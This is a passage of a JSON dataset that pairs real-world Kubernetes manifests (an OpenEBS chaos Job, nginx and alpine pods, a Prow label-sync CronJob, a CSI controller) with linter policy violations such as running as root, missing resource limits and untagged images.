    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      labels:\n        name: openebs-target-failure\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_NAMESPACE\n          value: litmus\n        - name: TARGET_NAMESPACE\n          value: openebs\n        - name: APP_LABEL\n          value: name=percona\n        - name: APP_PVC\n          value: percona-mysql-claim\n        - name: LIVENESS_APP_LABEL\n          value: ''\n        - name: LIVENESS_APP_NAMESPACE\n          value: ''\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./percona/chaos/openebs_target_failure/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n        volumeMounts:\n        - name: logs\n          mountPath: /var/log/ansible\n      - name: logger\n        image: openebs/logger\n        env:\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_HOSTPATH\n          value: /mnt/chaos/openebs-cstor-target-failure\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ./logger.sh -d ansibletest -r maya,openebs,pvc,percona; exit 0\n        volumeMounts:\n        - name: kubeconfig\n          mountPath: /root/admin.conf\n          subPath: admin.conf\n        - name: logs\n          mountPath: /mnt\n      volumes:\n      - name: kubeconfig\n        configMap:\n          name: kubeconfig\n      - name: logs\n        hostPath:\n          path: /mnt/chaos/openebs_cstor_target_failure\n          type: ''\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ansibletest\" does not have a read-only root file system"
  },
  {
    "id": "03706",
    "manifest_path": "data/manifests/the_stack_sample/sample_1648.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      labels:\n        name: openebs-target-failure\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_NAMESPACE\n          value: litmus\n        - name: TARGET_NAMESPACE\n          value: openebs\n        - name: APP_LABEL\n          value: name=percona\n        - name: APP_PVC\n          value: percona-mysql-claim\n        - name: LIVENESS_APP_LABEL\n          value: ''\n        - name: LIVENESS_APP_NAMESPACE\n          value: ''\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./percona/chaos/openebs_target_failure/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n        volumeMounts:\n        - name: logs\n          mountPath: /var/log/ansible\n      - name: logger\n        image: openebs/logger\n        env:\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_HOSTPATH\n          value: /mnt/chaos/openebs-cstor-target-failure\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ./logger.sh -d ansibletest -r maya,openebs,pvc,percona; exit 0\n        volumeMounts:\n        - name: kubeconfig\n          mountPath: /root/admin.conf\n          subPath: admin.conf\n        - name: logs\n          mountPath: /mnt\n      volumes:\n      - name: kubeconfig\n        configMap:\n          name: kubeconfig\n      - name: logs\n        hostPath:\n          path: /mnt/chaos/openebs_cstor_target_failure\n          type: ''\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"logger\" does not have a read-only root file system"
  },
  {
    "id": "03707",
    "manifest_path": "data/manifests/the_stack_sample/sample_1648.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      labels:\n        name: openebs-target-failure\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_NAMESPACE\n          value: litmus\n        - name: TARGET_NAMESPACE\n          value: openebs\n        - name: APP_LABEL\n          value: name=percona\n        - name: APP_PVC\n          value: percona-mysql-claim\n        - name: LIVENESS_APP_LABEL\n          value: ''\n        - name: LIVENESS_APP_NAMESPACE\n          value: ''\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./percona/chaos/openebs_target_failure/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n        volumeMounts:\n        - name: logs\n          mountPath: /var/log/ansible\n      - name: logger\n        image: openebs/logger\n        env:\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_HOSTPATH\n          value: /mnt/chaos/openebs-cstor-target-failure\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ./logger.sh -d ansibletest -r maya,openebs,pvc,percona; exit 0\n        volumeMounts:\n        - name: kubeconfig\n          mountPath: /root/admin.conf\n          subPath: admin.conf\n        - name: logs\n          mountPath: /mnt\n      volumes:\n      - name: kubeconfig\n        configMap:\n          name: kubeconfig\n      - name: logs\n        hostPath:\n          path: /mnt/chaos/openebs_cstor_target_failure\n          type: ''\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ansibletest\" is not set to runAsNonRoot"
  },
  {
    "id": "03708",
    "manifest_path": "data/manifests/the_stack_sample/sample_1648.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      labels:\n        name: openebs-target-failure\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_NAMESPACE\n          value: litmus\n        - name: TARGET_NAMESPACE\n          value: openebs\n        - name: APP_LABEL\n          value: name=percona\n        - name: APP_PVC\n          value: percona-mysql-claim\n        - name: LIVENESS_APP_LABEL\n          value: ''\n        - name: LIVENESS_APP_NAMESPACE\n          value: ''\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./percona/chaos/openebs_target_failure/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n        volumeMounts:\n        - name: logs\n          mountPath: /var/log/ansible\n      - name: logger\n        image: openebs/logger\n        env:\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_HOSTPATH\n          value: /mnt/chaos/openebs-cstor-target-failure\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ./logger.sh -d ansibletest -r maya,openebs,pvc,percona; exit 0\n        volumeMounts:\n        - name: kubeconfig\n          mountPath: /root/admin.conf\n          subPath: admin.conf\n        - name: logs\n          mountPath: /mnt\n      volumes:\n      - name: kubeconfig\n        configMap:\n          name: kubeconfig\n      - name: logs\n        hostPath:\n          path: /mnt/chaos/openebs_cstor_target_failure\n          type: ''\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"logger\" is not set to runAsNonRoot"
  },
  {
    "id": "03709",
    "manifest_path": "data/manifests/the_stack_sample/sample_1648.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      labels:\n        name: openebs-target-failure\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_NAMESPACE\n          value: litmus\n        - name: TARGET_NAMESPACE\n          value: openebs\n        - name: APP_LABEL\n          value: name=percona\n        - name: APP_PVC\n          value: percona-mysql-claim\n        - name: LIVENESS_APP_LABEL\n          value: ''\n        - name: LIVENESS_APP_NAMESPACE\n          value: ''\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./percona/chaos/openebs_target_failure/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n        volumeMounts:\n        - name: logs\n          mountPath: /var/log/ansible\n      - name: logger\n        image: openebs/logger\n        env:\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_HOSTPATH\n          value: /mnt/chaos/openebs-cstor-target-failure\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ./logger.sh -d ansibletest -r maya,openebs,pvc,percona; exit 0\n        volumeMounts:\n        - name: kubeconfig\n          mountPath: /root/admin.conf\n          subPath: admin.conf\n        - name: logs\n          mountPath: /mnt\n      volumes:\n      - name: kubeconfig\n        configMap:\n          name: kubeconfig\n      - name: logs\n        hostPath:\n          path: /mnt/chaos/openebs_cstor_target_failure\n          type: ''\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ansibletest\" has cpu request 0"
  },
  {
    "id": "03710",
    "manifest_path": "data/manifests/the_stack_sample/sample_1648.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      labels:\n        name: openebs-target-failure\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_NAMESPACE\n          value: litmus\n        - name: TARGET_NAMESPACE\n          value: openebs\n        - name: APP_LABEL\n          value: name=percona\n        - name: APP_PVC\n          value: percona-mysql-claim\n        - name: LIVENESS_APP_LABEL\n          value: ''\n        - name: LIVENESS_APP_NAMESPACE\n          value: ''\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./percona/chaos/openebs_target_failure/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n        volumeMounts:\n        - name: logs\n          mountPath: /var/log/ansible\n      - name: logger\n        image: openebs/logger\n        env:\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_HOSTPATH\n          value: /mnt/chaos/openebs-cstor-target-failure\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ./logger.sh -d ansibletest -r maya,openebs,pvc,percona; exit 0\n        volumeMounts:\n        - name: kubeconfig\n          mountPath: /root/admin.conf\n          subPath: admin.conf\n        - name: logs\n          mountPath: /mnt\n      volumes:\n      - name: kubeconfig\n        configMap:\n          name: kubeconfig\n      - name: logs\n        hostPath:\n          path: /mnt/chaos/openebs_cstor_target_failure\n          type: ''\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"logger\" has cpu request 0"
  },
  {
    "id": "03711",
    "manifest_path": "data/manifests/the_stack_sample/sample_1648.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      labels:\n        name: openebs-target-failure\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_NAMESPACE\n          value: litmus\n        - name: TARGET_NAMESPACE\n          value: openebs\n        - name: APP_LABEL\n          value: name=percona\n        - name: APP_PVC\n          value: percona-mysql-claim\n        - name: LIVENESS_APP_LABEL\n          value: ''\n        - name: LIVENESS_APP_NAMESPACE\n          value: ''\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./percona/chaos/openebs_target_failure/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n        volumeMounts:\n        - name: logs\n          mountPath: /var/log/ansible\n      - name: logger\n        image: openebs/logger\n        env:\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_HOSTPATH\n          value: /mnt/chaos/openebs-cstor-target-failure\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ./logger.sh -d ansibletest -r maya,openebs,pvc,percona; exit 0\n        volumeMounts:\n        - name: kubeconfig\n          mountPath: /root/admin.conf\n          subPath: admin.conf\n        - name: logs\n          mountPath: /mnt\n      volumes:\n      - name: kubeconfig\n        configMap:\n          name: kubeconfig\n      - name: logs\n        hostPath:\n          path: /mnt/chaos/openebs_cstor_target_failure\n          type: ''\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ansibletest\" has memory limit 0"
  },
  {
    "id": "03712",
    "manifest_path": "data/manifests/the_stack_sample/sample_1648.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      labels:\n        name: openebs-target-failure\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_NAMESPACE\n          value: litmus\n        - name: TARGET_NAMESPACE\n          value: openebs\n        - name: APP_LABEL\n          value: name=percona\n        - name: APP_PVC\n          value: percona-mysql-claim\n        - name: LIVENESS_APP_LABEL\n          value: ''\n        - name: LIVENESS_APP_NAMESPACE\n          value: ''\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./percona/chaos/openebs_target_failure/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n        volumeMounts:\n        - name: logs\n          mountPath: /var/log/ansible\n      - name: logger\n        image: openebs/logger\n        env:\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_HOSTPATH\n          value: /mnt/chaos/openebs-cstor-target-failure\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ./logger.sh -d ansibletest -r maya,openebs,pvc,percona; exit 0\n        volumeMounts:\n        - name: kubeconfig\n          mountPath: /root/admin.conf\n          subPath: admin.conf\n        - name: logs\n          mountPath: /mnt\n      volumes:\n      - name: kubeconfig\n        configMap:\n          name: kubeconfig\n      - name: logs\n        hostPath:\n          path: /mnt/chaos/openebs_cstor_target_failure\n          type: ''\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"logger\" has memory limit 0"
  },
  {
    "id": "03713",
    "manifest_path": "data/manifests/the_stack_sample/sample_1650.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8801\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03714",
    "manifest_path": "data/manifests/the_stack_sample/sample_1650.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8801\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03715",
    "manifest_path": "data/manifests/the_stack_sample/sample_1650.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8801\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03716",
    "manifest_path": "data/manifests/the_stack_sample/sample_1650.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8801\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03717",
    "manifest_path": "data/manifests/the_stack_sample/sample_1650.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8801\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03718",
    "manifest_path": "data/manifests/the_stack_sample/sample_1655.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7369\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03719",
    "manifest_path": "data/manifests/the_stack_sample/sample_1655.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7369\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03720",
    "manifest_path": "data/manifests/the_stack_sample/sample_1655.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7369\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03721",
    "manifest_path": "data/manifests/the_stack_sample/sample_1655.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7369\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03722",
    "manifest_path": "data/manifests/the_stack_sample/sample_1655.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7369\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03723",
    "manifest_path": "data/manifests/the_stack_sample/sample_1658.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20200628-cc1c099dad\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"label-sync\" does not have a read-only root file system"
  },
  {
    "id": "03724",
    "manifest_path": "data/manifests/the_stack_sample/sample_1658.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20200628-cc1c099dad\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"label-sync\" is not set to runAsNonRoot"
  },
  {
    "id": "03725",
    "manifest_path": "data/manifests/the_stack_sample/sample_1658.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20200628-cc1c099dad\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"label-sync\" has cpu request 0"
  },
  {
    "id": "03726",
    "manifest_path": "data/manifests/the_stack_sample/sample_1658.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20200628-cc1c099dad\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"label-sync\" has memory limit 0"
  },
  {
    "id": "03727",
    "manifest_path": "data/manifests/the_stack_sample/sample_1659.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: demo-pod\nspec:\n  containers:\n  - name: container1\n    image: alpine\n    volumeMounts:\n    - name: volume1\n      mountPath: /mnt\n    command:\n    - dd\n    args:\n    - if=/dev/zero\n    - of=/mnt/demofile\n    - bs=1M\n    - count=1000\n  volumes:\n  - name: volume1\n    persistentVolumeClaim:\n      claimName: demo-pvc\n      readOnly: false\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"container1\" is using an invalid container image, \"alpine\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03728",
    "manifest_path": "data/manifests/the_stack_sample/sample_1659.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: demo-pod\nspec:\n  containers:\n  - name: container1\n    image: alpine\n    volumeMounts:\n    - name: volume1\n      mountPath: /mnt\n    command:\n    - dd\n    args:\n    - if=/dev/zero\n    - of=/mnt/demofile\n    - bs=1M\n    - count=1000\n  volumes:\n  - name: volume1\n    persistentVolumeClaim:\n      claimName: demo-pvc\n      readOnly: false\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container1\" does not have a read-only root file system"
  },
  {
    "id": "03729",
    "manifest_path": "data/manifests/the_stack_sample/sample_1659.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: demo-pod\nspec:\n  containers:\n  - name: container1\n    image: alpine\n    volumeMounts:\n    - name: volume1\n      mountPath: /mnt\n    command:\n    - dd\n    args:\n    - if=/dev/zero\n    - of=/mnt/demofile\n    - bs=1M\n    - count=1000\n  volumes:\n  - name: volume1\n    persistentVolumeClaim:\n      claimName: demo-pvc\n      readOnly: false\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"container1\" is not set to runAsNonRoot"
  },
  {
    "id": "03730",
    "manifest_path": "data/manifests/the_stack_sample/sample_1659.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: demo-pod\nspec:\n  containers:\n  - name: container1\n    image: alpine\n    volumeMounts:\n    - name: volume1\n      mountPath: /mnt\n    command:\n    - dd\n    args:\n    - if=/dev/zero\n    - of=/mnt/demofile\n    - bs=1M\n    - count=1000\n  volumes:\n  - name: volume1\n    persistentVolumeClaim:\n      claimName: demo-pvc\n      readOnly: false\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container1\" has cpu request 0"
  },
  {
    "id": "03731",
    "manifest_path": "data/manifests/the_stack_sample/sample_1659.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: demo-pod\nspec:\n  containers:\n  - name: container1\n    image: alpine\n    volumeMounts:\n    - name: volume1\n      mountPath: /mnt\n    command:\n    - dd\n    args:\n    - if=/dev/zero\n    - of=/mnt/demofile\n    - bs=1M\n    - count=1000\n  volumes:\n  - name: volume1\n    persistentVolumeClaim:\n      claimName: demo-pvc\n      readOnly: false\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container1\" has memory limit 0"
  },
  {
    "id": "03732",
    "manifest_path": "data/manifests/the_stack_sample/sample_1660.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: storagepodlet\nspec:\n  containers:\n  - name: nginx-with-pv\n    image: nginx:latest\n    ports:\n    - name: http\n      containerPort: 80\n      protocol: TCP\n    volumeMounts:\n    - name: nginx-pv-storage\n      mountPath: /data\n  volumes:\n  - name: nginx-pv-storage\n    persistentVolumeClaim:\n      claimName: persistentclaimchallenge\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx-with-pv\" is using an invalid container image, \"nginx:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03733",
    "manifest_path": "data/manifests/the_stack_sample/sample_1660.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: storagepodlet\nspec:\n  containers:\n  - name: nginx-with-pv\n    image: nginx:latest\n    ports:\n    - name: http\n      containerPort: 80\n      protocol: TCP\n    volumeMounts:\n    - name: nginx-pv-storage\n      mountPath: /data\n  volumes:\n  - name: nginx-pv-storage\n    persistentVolumeClaim:\n      claimName: persistentclaimchallenge\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-with-pv\" does not have a read-only root file system"
  },
  {
    "id": "03734",
    "manifest_path": "data/manifests/the_stack_sample/sample_1660.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: storagepodlet\nspec:\n  containers:\n  - name: nginx-with-pv\n    image: nginx:latest\n    ports:\n    - name: http\n      containerPort: 80\n      protocol: TCP\n    volumeMounts:\n    - name: nginx-pv-storage\n      mountPath: /data\n  volumes:\n  - name: nginx-pv-storage\n    persistentVolumeClaim:\n      claimName: persistentclaimchallenge\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-with-pv\" is not set to runAsNonRoot"
  },
  {
    "id": "03735",
    "manifest_path": "data/manifests/the_stack_sample/sample_1660.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: storagepodlet\nspec:\n  containers:\n  - name: nginx-with-pv\n    image: nginx:latest\n    ports:\n    - name: http\n      containerPort: 80\n      protocol: TCP\n    volumeMounts:\n    - name: nginx-pv-storage\n      mountPath: /data\n  volumes:\n  - name: nginx-pv-storage\n    persistentVolumeClaim:\n      claimName: persistentclaimchallenge\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-with-pv\" has cpu request 0"
  },
  {
    "id": "03736",
    "manifest_path": "data/manifests/the_stack_sample/sample_1660.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: storagepodlet\nspec:\n  containers:\n  - name: nginx-with-pv\n    image: nginx:latest\n    ports:\n    - name: http\n      containerPort: 80\n      protocol: TCP\n    volumeMounts:\n    - name: nginx-pv-storage\n      mountPath: /data\n  volumes:\n  - name: nginx-pv-storage\n    persistentVolumeClaim:\n      claimName: persistentclaimchallenge\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-with-pv\" has memory limit 0"
  },
  {
    "id": "03737",
    "manifest_path": "data/manifests/the_stack_sample/sample_1663.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v2.1.0\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --timeout=60s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.3.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: 